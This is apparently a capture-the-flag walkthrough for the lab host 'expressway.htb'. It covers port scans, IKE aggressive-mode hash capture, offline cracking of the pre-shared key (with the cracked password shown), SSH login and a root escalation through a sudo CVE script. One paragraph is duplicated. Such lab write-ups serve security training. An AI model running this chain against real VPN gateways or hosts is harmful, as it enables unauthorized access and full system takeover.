Port scanning
```bash
nmap -p- --min-rate=5000 10.10.11.87
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-05 15:53 EDT
Nmap scan report for 10.10.11.87
Host is up (0.064s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 14.16 seconds


Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-05 15:55 EDT
Nmap scan report for 10.10.11.87
Host is up (0.095s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.64 seconds
```
Ok so we only have ssh. 

Let's do an UDP scan instead
```bash
nmap --top-ports 1000 -sU 10.10.11.87 --min-rate=10000
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-19 09:42 EDT
Nmap scan report for 10.10.11.87
Host is up (0.089s latency).
Not shown: 995 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
13/udp    closed daytime
500/udp   open   isakmp
6050/udp  closed x11
17629/udp closed unknown
42639/udp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 0.74 seconds
```
```bash
nmap -sC -sV -sU -p 13,500,6050,17629,42639 10.10.11.87
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-19 09:44 EDT
Nmap scan report for 10.10.11.87
Host is up (0.099s latency).

PORT      STATE  SERVICE VERSION
13/udp    closed daytime
500/udp   open   isakmp?
| ike-version: 
|   attributes: 
|     XAUTH
|_    Dead Peer Detection v1.0
6050/udp  closed x11
17629/udp closed unknown
42639/udp closed unknown

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 128.16 seconds
```



Ok so the only one that's open is the port 500 so let's research it and see if we can use it to our advantage...

https://angelica.gitbook.io/hacktricks/network-services-pentesting/ipsec-ike-vpn-pentesting

I found this useful website talking about the port in detail

```bash
 sudo ike-scan -A 10.10.11.87
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned HDR=(CKY-R=cd025f768935800b) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.119 seconds (8.40 hosts/sec).  1 returned handshake; 0 returned notify
```

Here we can find a value = ike@expressway.htb 

This is going to be useful.

```bash
sudo ike-scan -A 10.10.11.87 --id=ike@expressway.htb -P ike.psk
```

with this we are doing the previous ike scan but with the identity of the thing we found. And storing that into ike.psk file. Which we can then crack

```bash
psk-crack -d /usr/share/wordlists/rockyou.txt ike.psk 
Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash 943307451fe35ad647718f10cd756bab3fcd08b8
Ending psk-crack: 8045040 iterations in 4.797 seconds (1677066.02 iterations/sec)
```
I tried the cracked pass to the ssh and user of ike and was able to log in.

```bash
ssh ike@10.10.11.87                                            
ike@10.10.11.87's password: 
Last login: Sun Oct 19 14:12:41 BST 2025 from 10.10.14.52 on ssh
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Oct 19 15:20:05 2025 from 10.10.14.73
ike@expressway:~$ 
```

I imported linpeas over and did a scan to see what privescs we could possibly have.

In the scan it was revealed that we are in a group "proxy" 

I decided to check all the files with the owner of proxy

```bash
ike@expressway:~$ find / -user "proxy" 2>/dev/null
/run/squid
/var/spool/squid
/var/spool/squid/netdb.state
/var/log/squid
/var/log/squid/cache.log.2.gz
/var/log/squid/access.log.2.gz
/var/log/squid/cache.log.1
/var/log/squid/access.log.1
```

In the scan it was revealed that we are in a group "proxy" 

I decided to check all the files with the owner of proxy

```bash
ike@expressway:~$ find / -user "proxy" 2>/dev/null
/run/squid
/var/spool/squid
/var/spool/squid/netdb.state
/var/log/squid
/var/log/squid/cache.log.2.gz
/var/log/squid/access.log.2.gz
/var/log/squid/cache.log.1
/var/log/squid/access.log.1
```

I was stuck for a while until i stumbled upon a bash script inside the /tmp folder which exploited a CVE in the sudo command which allowed for us to escalate priviledges to root.
https://github.com/kh4sh3i/CVE-2025-32463
```bash
ike@expressway:/tmp$ ./sudo_root.sh 
woot!
root@expressway:/# id
uid=0(root) gid=0(root) groups=0(root),13(proxy),1001(ike)
```

